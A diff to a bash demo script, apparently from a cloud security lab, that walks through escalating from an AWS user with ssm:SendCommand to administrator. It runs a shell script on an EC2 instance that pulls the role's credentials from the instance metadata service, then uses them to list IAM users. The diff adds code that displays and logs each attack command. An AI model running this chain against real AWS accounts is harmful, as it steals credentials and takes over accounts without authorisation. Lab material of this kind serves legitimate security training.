@@ -4,7 +4,9 @@
 # This scenario demonstrates how a user with ssm:SendCommand can execute commands
 # on EC2 instances with privileged roles to extract credentials and gain admin access
 
-set -e
+
+# Disable AWS CLI paging
+export AWS_PAGER=""
 
 # Colors for output
 RED='\033[0;31m'
@@ -12,6 +14,24 @@ GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 NC='\033[0m' # No Color
+
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
 
 # Configuration
 STARTING_USER="pl-prod-ssm-002-to-admin-starting-user"
@@ -79,6 +99,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
+show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -90,6 +111,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
+show_cmd "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -97,6 +119,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 # Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
+show_cmd "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -133,6 +156,7 @@ RETRY_COUNT=0
 SSM_READY=false
 
 while [ $RETRY_COUNT -lt $MAX_RETRIES ]; do
+    show_cmd "aws ssm describe-instance-information --region $AWS_REGION --filters \"Key=InstanceIds,Values=$INSTANCE_ID\" --query 'InstanceInformationList[0].PingStatus' --output text"
     SSM_STATUS=$(aws ssm describe-instance-information \
         --region $AWS_REGION \
         --filters "Key=InstanceIds,Values=$INSTANCE_ID" \
@@ -164,6 +188,7 @@ echo -e "${YELLOW}Step 7: Sending SSM command to extract instance role credentia
 echo "This is the privilege escalation vector..."
 echo "Executing command to retrieve credentials from instance metadata service"
 
+show_attack_cmd "aws ssm send-command --region $AWS_REGION --instance-ids \"$INSTANCE_ID\" --document-name \"AWS-RunShellScript\" --parameters 'commands=[\"TOKEN=\$(curl -X PUT \\\"http://169.254.169.254/latest/api/token\\\" -H \\\"X-aws-ec2-metadata-token-ttl-seconds: 21600\\\" 2>/dev/null)\",\"curl -H \\\"X-aws-ec2-metadata-token: \$TOKEN\\\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$EC2_ROLE_NAME 2>/dev/null\"]'"
 COMMAND_ID=$(aws ssm send-command \
     --region $AWS_REGION \
     --instance-ids "$INSTANCE_ID" \
@@ -224,6 +249,7 @@ echo ""
 # Step 9: Retrieve command output containing credentials
 echo -e "${YELLOW}Step 9: Retrieving command output with extracted credentials${NC}"
 
+show_attack_cmd "aws ssm get-command-invocation --region $AWS_REGION --command-id \"$COMMAND_ID\" --instance-id \"$INSTANCE_ID\" --query 'StandardOutputContent' --output text"
 CREDS_JSON=$(aws ssm list-command-invocations \
     --region $AWS_REGION \
     --command-id "$COMMAND_ID" \
@@ -261,6 +287,7 @@ export AWS_SESSION_TOKEN="$EXTRACTED_SESSION_TOKEN"
 export AWS_REGION=$AWS_REGION
 
 # Verify new identity
+show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
 NEW_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "New identity: $NEW_IDENTITY"
 echo -e "${GREEN}✓ Now using extracted EC2 instance role credentials${NC}\n"
@@ -269,6 +296,7 @@ echo -e "${GREEN}✓ Now using extracted EC2 instance role credentials${NC}\n"
 echo -e "${YELLOW}Step 11: Verifying administrator access${NC}"
 echo "Attempting to list IAM users..."
 
+show_cmd "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
@@ -292,6 +320,13 @@ echo "5. Achieved: Administrator Access"
 echo -e "\n${YELLOW}Attack Path:${NC}"
 echo -e "  $STARTING_USER → (ssm:SendCommand) → EC2 Instance"
 echo -e "  → (Extract Credentials) → $EC2_ADMIN_ROLE → Admin"
+
+if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+    echo -e "\n${YELLOW}Attack Commands:${NC}"
+    for cmd in "${ATTACK_COMMANDS[@]}"; do
+        echo -e "  ${CYAN}\$ ${cmd}${NC}"
+    done
+fi
 
 echo -e "\n${YELLOW}Attack Artifacts:${NC}"
 echo "- SSM Command: $COMMAND_ID"
